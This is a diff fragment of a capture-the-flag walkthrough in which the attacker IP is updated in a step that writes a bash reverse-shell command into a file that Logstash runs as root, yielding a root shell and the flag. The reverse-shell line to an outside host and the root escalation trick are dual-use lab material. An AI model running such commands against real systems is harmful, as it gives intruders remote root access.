@@ -273,7 +273,7 @@ the command will be executed as `root`.
 
 Let's write the file that contains the reverse shell connection:
 ```
-echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.2/1338 0>&1" > /opt/kibana/logstash_revshell
+echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.18/1338 0>&1" > /opt/kibana/logstash_revshell
 ```
 
 After a couple of seconds we will get our root shell and we can print the flag:
